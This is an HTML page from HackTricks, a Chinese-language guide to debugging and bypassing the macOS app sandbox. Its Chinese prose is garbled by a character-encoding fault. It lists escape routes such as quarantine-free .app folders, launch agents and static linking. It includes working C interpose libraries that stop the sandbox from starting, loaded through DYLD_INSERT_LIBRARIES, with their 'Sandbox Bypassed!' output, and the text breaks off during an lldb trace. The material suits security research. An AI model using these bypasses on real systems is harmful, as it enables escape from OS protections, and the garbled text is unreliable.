<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>macOS Sandbox Debug &amp; Bypass</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../../../favicon.svg">
        <link rel="shortcut icon" href="../../../../../favicon.png">
        <link rel="stylesheet" href="../../../../../css/variables.css">
        <link rel="stylesheet" href="../../../../../css/general.css">
        <link rel="stylesheet" href="../../../../../css/chrome.css">
        <link rel="stylesheet" href="../../../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../../../highlight.css">
        <link rel="stylesheet" href="../../../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="macos-sandbox-debug--bypass"><a class="header" href="#macos-sandbox-debug--bypass">macOS Sandbox Debug &amp; Bypass</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
{% endhint %}
<h2 id="sandbox-åŠ è½½è¿‡ç¨‹"><a class="header" href="#sandbox-åŠ è½½è¿‡ç¨‹">Sandbox åŠ è½½è¿‡ç¨‹</a></h2>
<figure><img src="../../../../../.gitbook/assets/image (901).png" alt=""><figcaption><p>å›¾ç‰‡æ¥è‡ª <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>
<p>åœ¨å‰é¢çš„å›¾åƒä¸­ï¼Œå¯ä»¥è§‚å¯Ÿåˆ° <strong>å½“è¿è¡Œå…·æœ‰æƒé™ <strong><code>com.apple.security.app-sandbox</code></strong> çš„åº”ç”¨ç¨‹åºæ—¶ï¼Œæ²™ç®±å°†å¦‚ä½•åŠ è½½</strong>ã€‚</p>
<p>ç¼–è¯‘å™¨å°†é“¾æ¥ <code>/usr/lib/libSystem.B.dylib</code> åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
<p>ç„¶åï¼Œ<strong><code>libSystem.B</code></strong> å°†è°ƒç”¨å…¶ä»–å‡ ä¸ªå‡½æ•°ï¼Œç›´åˆ° <strong><code>xpc_pipe_routine</code></strong> å°†åº”ç”¨ç¨‹åºçš„æƒé™å‘é€åˆ° <strong><code>securityd</code></strong>ã€‚Securityd æ£€æŸ¥è¯¥è¿›ç¨‹æ˜¯å¦åº”è¯¥åœ¨æ²™ç®±å†…è¿›è¡Œéš”ç¦»ï¼Œå¦‚æœæ˜¯ï¼Œå®ƒå°†è¢«éš”ç¦»ã€‚<br />
æœ€åï¼Œæ²™ç®±å°†é€šè¿‡è°ƒç”¨ <strong><code>__sandbox_ms</code></strong> æ¿€æ´»ï¼Œè¯¥è°ƒç”¨å°†è°ƒç”¨ <strong><code>__mac_syscall</code></strong>ã€‚</p>
<h2 id="å¯èƒ½çš„ç»•è¿‡æ–¹æ³•"><a class="header" href="#å¯èƒ½çš„ç»•è¿‡æ–¹æ³•">å¯èƒ½çš„ç»•è¿‡æ–¹æ³•</a></h2>
<h3 id="ç»•è¿‡éš”ç¦»å±æ€§"><a class="header" href="#ç»•è¿‡éš”ç¦»å±æ€§">ç»•è¿‡éš”ç¦»å±æ€§</a></h3>
<p><strong>ç”±æ²™ç®±è¿›ç¨‹åˆ›å»ºçš„æ–‡ä»¶</strong> é™„åŠ äº† <strong>éš”ç¦»å±æ€§</strong> ä»¥é˜²æ­¢æ²™ç®±é€ƒé€¸ã€‚ç„¶è€Œï¼Œå¦‚æœä½ è®¾æ³• <strong>åœ¨æ²™ç®±åº”ç”¨ç¨‹åºå†…åˆ›å»ºä¸€ä¸ªæ²¡æœ‰éš”ç¦»å±æ€§çš„ <code>.app</code> æ–‡ä»¶å¤¹</strong>ï¼Œä½ å¯ä»¥ä½¿åº”ç”¨ç¨‹åºåŒ…çš„äºŒè¿›åˆ¶æ–‡ä»¶æŒ‡å‘ <strong><code>/bin/bash</code></strong> å¹¶åœ¨ <strong>plist</strong> ä¸­æ·»åŠ ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œä»¥åˆ©ç”¨ <strong><code>open</code></strong> æ¥ <strong>å¯åŠ¨æ–°çš„æœªæ²™ç®±åº”ç”¨ç¨‹åº</strong>ã€‚</p>
<p>è¿™å°±æ˜¯åœ¨ <a href="https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html"><strong>CVE-2023-32364</strong></a>** ä¸­æ‰€åšçš„**ã€‚</p>
<p>{% hint style="danger" %}
å› æ­¤ï¼Œç›®å‰ï¼Œå¦‚æœä½ ä»…èƒ½åˆ›å»ºä¸€ä¸ªåç§°ä»¥ <strong><code>.app</code></strong> ç»“å°¾ä¸”æ²¡æœ‰éš”ç¦»å±æ€§çš„æ–‡ä»¶å¤¹ï¼Œä½ å¯ä»¥é€ƒç¦»æ²™ç®±ï¼Œå› ä¸º macOS åª <strong>æ£€æŸ¥</strong> <strong><code>.app</code> æ–‡ä»¶å¤¹</strong> å’Œ <strong>ä¸»å¯æ‰§è¡Œæ–‡ä»¶</strong> ä¸­çš„ <strong>éš”ç¦»</strong> å±æ€§ï¼ˆæˆ‘ä»¬å°†æŠŠä¸»å¯æ‰§è¡Œæ–‡ä»¶æŒ‡å‘ <strong><code>/bin/bash</code></strong>ï¼‰ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œå¦‚æœä¸€ä¸ª .app åŒ…å·²ç»è¢«æˆæƒè¿è¡Œï¼ˆå®ƒå…·æœ‰å¸¦æœ‰æˆæƒè¿è¡Œæ ‡å¿—çš„éš”ç¦» xttrï¼‰ï¼Œä½ ä¹Ÿå¯ä»¥åˆ©ç”¨å®ƒâ€¦â€¦åªæ˜¯ç°åœ¨ä½ ä¸èƒ½åœ¨ <strong><code>.app</code></strong> åŒ…å†…å†™å…¥ï¼Œé™¤éä½ æ‹¥æœ‰ä¸€äº›ç‰¹æƒ TCC æƒé™ï¼ˆåœ¨é«˜æ²™ç®±å†…ä½ å°†æ²¡æœ‰è¿™äº›æƒé™ï¼‰ã€‚
{% endhint %}</p>
<h3 id="åˆ©ç”¨-open-åŠŸèƒ½"><a class="header" href="#åˆ©ç”¨-open-åŠŸèƒ½">åˆ©ç”¨ Open åŠŸèƒ½</a></h3>
<p>åœ¨ <a href="macos-office-sandbox-bypasses.html#word-sandbox-bypass-via-login-items-and-.zshenv"><strong>Word æ²™ç®±ç»•è¿‡çš„æœ€åç¤ºä¾‹</strong></a> ä¸­å¯ä»¥çœ‹åˆ°å¦‚ä½•åˆ©ç”¨ <strong><code>open</code></strong> CLI åŠŸèƒ½æ¥ç»•è¿‡æ²™ç®±ã€‚</p>
<p>{% content-ref url="macos-office-sandbox-bypasses.md" %}
<a href="macos-office-sandbox-bypasses.html">macos-office-sandbox-bypasses.md</a>
{% endcontent-ref %}</p>
<h3 id="å¯åŠ¨ä»£ç†å®ˆæŠ¤è¿›ç¨‹"><a class="header" href="#å¯åŠ¨ä»£ç†å®ˆæŠ¤è¿›ç¨‹">å¯åŠ¨ä»£ç†/å®ˆæŠ¤è¿›ç¨‹</a></h3>
<p>å³ä½¿ä¸€ä¸ªåº”ç”¨ç¨‹åº <strong>æ—¨åœ¨è¢«æ²™ç®±åŒ–</strong> (<code>com.apple.security.app-sandbox</code>)ï¼Œå¦‚æœå®ƒ <strong>ä» LaunchAgent æ‰§è¡Œ</strong>ï¼ˆä¾‹å¦‚ <code>~/Library/LaunchAgents</code>ï¼‰ï¼Œä¹Ÿå¯ä»¥ç»•è¿‡æ²™ç®±ã€‚<br />
æ­£å¦‚åœ¨ <a href="https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818"><strong>è¿™ç¯‡æ–‡ç« </strong></a> ä¸­æ‰€è§£é‡Šçš„ï¼Œå¦‚æœä½ æƒ³è¦åœ¨ä¸€ä¸ªæ²™ç®±åº”ç”¨ç¨‹åºä¸­è·å¾—æŒä¹…æ€§ï¼Œä½ å¯ä»¥ä½¿å…¶ä½œä¸º LaunchAgent è‡ªåŠ¨æ‰§è¡Œï¼Œå¹¶å¯èƒ½é€šè¿‡ DyLib ç¯å¢ƒå˜é‡æ³¨å…¥æ¶æ„ä»£ç ã€‚</p>
<h3 id="åˆ©ç”¨è‡ªåŠ¨å¯åŠ¨ä½ç½®"><a class="header" href="#åˆ©ç”¨è‡ªåŠ¨å¯åŠ¨ä½ç½®">åˆ©ç”¨è‡ªåŠ¨å¯åŠ¨ä½ç½®</a></h3>
<p>å¦‚æœä¸€ä¸ªæ²™ç®±è¿›ç¨‹å¯ä»¥ <strong>åœ¨ä¸€ä¸ªåœ°æ–¹å†™å…¥</strong>ï¼Œ<strong>ç¨åä¸€ä¸ªæœªæ²™ç®±åº”ç”¨ç¨‹åºå°†è¿è¡Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶</strong>ï¼Œå®ƒå°†èƒ½å¤Ÿ <strong>é€šè¿‡å°†äºŒè¿›åˆ¶æ–‡ä»¶æ”¾ç½®åœ¨é‚£é‡Œ</strong> æ¥é€ƒç¦»æ²™ç®±ã€‚è¿™ç§ä½ç½®çš„ä¸€ä¸ªå¥½ä¾‹å­æ˜¯ <code>~/Library/LaunchAgents</code> æˆ– <code>/System/Library/LaunchDaemons</code>ã€‚</p>
<p>ä¸ºæ­¤ï¼Œä½ å¯èƒ½éœ€è¦ <strong>2 æ­¥</strong>ï¼šä½¿ä¸€ä¸ªå…·æœ‰ <strong>æ›´å®½æ¾æ²™ç®±</strong> (<code>file-read*</code>, <code>file-write*</code>) çš„è¿›ç¨‹æ‰§è¡Œä½ çš„ä»£ç ï¼Œè¯¥ä»£ç å®é™…ä¸Šå°†åœ¨ä¸€ä¸ªå°† <strong>æœªæ²™ç®±æ‰§è¡Œ</strong> çš„åœ°æ–¹å†™å…¥ã€‚</p>
<p>æŸ¥çœ‹å…³äº <strong>è‡ªåŠ¨å¯åŠ¨ä½ç½®</strong> çš„é¡µé¢ï¼š</p>
<p>{% content-ref url="../../../../macos-auto-start-locations.md" %}
<a href="../../../../macos-auto-start-locations.html">macos-auto-start-locations.md</a>
{% endcontent-ref %}</p>
<h3 id="åˆ©ç”¨å…¶ä»–è¿›ç¨‹"><a class="header" href="#åˆ©ç”¨å…¶ä»–è¿›ç¨‹">åˆ©ç”¨å…¶ä»–è¿›ç¨‹</a></h3>
<p>å¦‚æœä»æ²™ç®±è¿›ç¨‹ä¸­ä½ èƒ½å¤Ÿ <strong>å¦¥åå…¶ä»–åœ¨é™åˆ¶è¾ƒå°‘çš„æ²™ç®±ä¸­è¿è¡Œçš„è¿›ç¨‹</strong>ï¼ˆæˆ–æ²¡æœ‰æ²™ç®±ï¼‰ï¼Œä½ å°†èƒ½å¤Ÿé€ƒç¦»å®ƒä»¬çš„æ²™ç®±ï¼š</p>
<p>{% content-ref url="../../../macos-proces-abuse/" %}
<a href="../../../macos-proces-abuse/">macos-proces-abuse</a>
{% endcontent-ref %}</p>
<h3 id="é™æ€ç¼–è¯‘ä¸åŠ¨æ€é“¾æ¥"><a class="header" href="#é™æ€ç¼–è¯‘ä¸åŠ¨æ€é“¾æ¥">é™æ€ç¼–è¯‘ä¸åŠ¨æ€é“¾æ¥</a></h3>
<p><a href="https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/"><strong>è¿™é¡¹ç ”ç©¶</strong></a> å‘ç°äº†ç»•è¿‡æ²™ç®±çš„ä¸¤ç§æ–¹æ³•ã€‚å› ä¸ºæ²™ç®±æ˜¯åœ¨ç”¨æˆ·ç©ºé—´ä¸­åº”ç”¨çš„ï¼Œå½“ <strong>libSystem</strong> åº“è¢«åŠ è½½æ—¶ã€‚å¦‚æœä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶èƒ½å¤Ÿé¿å…åŠ è½½å®ƒï¼Œå®ƒå°†æ°¸è¿œä¸ä¼šè¢«æ²™ç®±åŒ–ï¼š</p>
<ul>
<li>å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ <strong>å®Œå…¨é™æ€ç¼–è¯‘</strong> çš„ï¼Œå®ƒå¯ä»¥é¿å…åŠ è½½è¯¥åº“ã€‚</li>
<li>å¦‚æœ <strong>äºŒè¿›åˆ¶æ–‡ä»¶ä¸éœ€è¦åŠ è½½ä»»ä½•åº“</strong>ï¼ˆå› ä¸ºé“¾æ¥å™¨ä¹Ÿåœ¨ libSystem ä¸­ï¼‰ï¼Œå®ƒå°†ä¸éœ€è¦åŠ è½½ libSystemã€‚</li>
</ul>
<h3 id="shellcodes"><a class="header" href="#shellcodes">Shellcodes</a></h3>
<p>è¯·æ³¨æ„ï¼Œ<strong>å³ä½¿æ˜¯ shellcodes</strong> åœ¨ ARM64 ä¸­ä¹Ÿéœ€è¦é“¾æ¥åˆ° <code>libSystem.dylib</code>ï¼š</p>
<pre><code class="language-bash">ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
</code></pre>
<h3 id="entitlements"><a class="header" href="#entitlements">Entitlements</a></h3>
<p>æ³¨æ„ï¼Œå³ä½¿æŸäº› <strong>æ“ä½œ</strong> å¯èƒ½åœ¨æ²™ç®±ä¸­è¢« <strong>å…è®¸</strong>ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå…·æœ‰ç‰¹å®šçš„ <strong>æƒé™</strong>ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-scheme">(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
</code></pre>
<h3 id="interposting-bypass"><a class="header" href="#interposting-bypass">Interposting Bypass</a></h3>
<p>æœ‰å…³ <strong>Interposting</strong> çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š</p>
<p>{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
<a href="../../../macos-proces-abuse/macos-function-hooking.html">macos-function-hooking.md</a>
{% endcontent-ref %}</p>
<h4 id="interpost-_libsecinit_initializer-ä»¥é˜²æ­¢æ²™ç›’"><a class="header" href="#interpost-_libsecinit_initializer-ä»¥é˜²æ­¢æ²™ç›’">Interpost <code>_libsecinit_initializer</code> ä»¥é˜²æ­¢æ²™ç›’</a></h4>
<pre><code class="language-c">// gcc -dynamiclib interpose.c -o interpose.dylib

#include &lt;stdio.h&gt;

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
</code></pre>
<pre><code class="language-bash">DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
</code></pre>
<h4 id="interpost-__mac_syscall-to-prevent-the-sandbox"><a class="header" href="#interpost-__mac_syscall-to-prevent-the-sandbox">Interpost <code>__mac_syscall</code> to prevent the Sandbox</a></h4>
<p>{% code title="interpose.c" %}</p>
<pre><code class="language-c">// gcc -dynamiclib interpose.c -o interpose.dylib

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 &amp;&amp; _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
</code></pre>
<p>{% endcode %}</p>
<pre><code class="language-bash">DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
</code></pre>
<h3 id="ä½¿ç”¨-lldb-è°ƒè¯•å’Œç»•è¿‡æ²™ç®±"><a class="header" href="#ä½¿ç”¨-lldb-è°ƒè¯•å’Œç»•è¿‡æ²™ç®±">ä½¿ç”¨ lldb è°ƒè¯•å’Œç»•è¿‡æ²™ç®±</a></h3>
<p>è®©æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªåº”è¯¥è¢«æ²™ç®±åŒ–çš„åº”ç”¨ç¨‹åºï¼š</p>
<p>{% tabs %}
{% tab title="sand.c" %}</p>
<pre><code class="language-c">#include &lt;stdlib.h&gt;
int main() {
system("cat ~/Desktop/del.txt");
}
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="entitlements.xml" %}</p>
<pre><code class="language-xml">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt; &lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
&lt;true/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>{% endtab %}</p>
<p>{% tab title="Info.plist" %}</p>
<pre><code class="language-xml">&lt;plist version="1.0"&gt;
&lt;dict&gt;
&lt;key&gt;CFBundleIdentifier&lt;/key&gt;
&lt;string&gt;xyz.hacktricks.sandbox&lt;/string&gt;
&lt;key&gt;CFBundleName&lt;/key&gt;
&lt;string&gt;Sandbox&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<p>ç„¶åç¼–è¯‘åº”ç”¨ç¨‹åºï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash"># Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s &lt;cert-name&gt; --entitlements entitlements.xml sand
</code></pre>
<p>{% endcode %}</p>
<p>{% hint style="danger" %}
è¯¥åº”ç”¨ç¨‹åºå°†å°è¯•<strong>è¯»å–</strong>æ–‡ä»¶**<code>~/Desktop/del.txt</code><strong>ï¼Œè€Œ</strong>Sandbox ä¸ä¼šå…è®¸**ã€‚<br />
åœ¨è¿™é‡Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå› ä¸ºä¸€æ—¦ç»•è¿‡ Sandboxï¼Œå®ƒå°†èƒ½å¤Ÿè¯»å–å®ƒï¼š</p>
<pre><code class="language-bash">echo "Sandbox Bypassed" &gt; ~/Desktop/del.txt
</code></pre>
<p>{% endhint %}</p>
<p>è®©æˆ‘ä»¬è°ƒè¯•åº”ç”¨ç¨‹åºï¼Œä»¥æŸ¥çœ‹æ²™ç®±ä½•æ—¶åŠ è½½ï¼š</p>
<pre><code class="language-bash"># Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "&lt;dictionary: 0x6000026001e0&gt; { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" =&gt; &lt;string: 0x600000c00d80&gt; { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" =&gt; &lt;array: 0x600000c00120&gt; { count = 42, capacity = 64, contents =\n\t\t0: &lt;string: 0x600000c000c0&gt; { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: &lt;string: 0x600000c001e0&gt; { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: &lt;string: 0x600000c000f0&gt; { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: &lt;string: 0x600000c00180&gt; { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: &lt;string: 0x600000c00060&gt; { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: &lt;string: 0x600000c001b0&gt; { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: &lt;string: 0x600000c00330&gt; { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: &lt;string: 0x600000c00210&gt; { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "&lt;dictionary: 0x600003d04000&gt; { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" =&gt; &lt;string: 0x600000c04d50&gt; { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" =&gt; &lt;uint64: 0xaabe660cef067137&gt;: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" =&gt; &lt;string: 0x600000c04e10&gt; { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" =&gt; &lt;data: 0x600001704100&gt;: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" =&gt; &lt;int64: 0xaa3e660cef06712f&gt;: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" =&gt; &lt;uint64: 0xaabe660cef067137&gt;: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" =&gt; &lt;uint64: 0xaabe660cef067127&gt;: 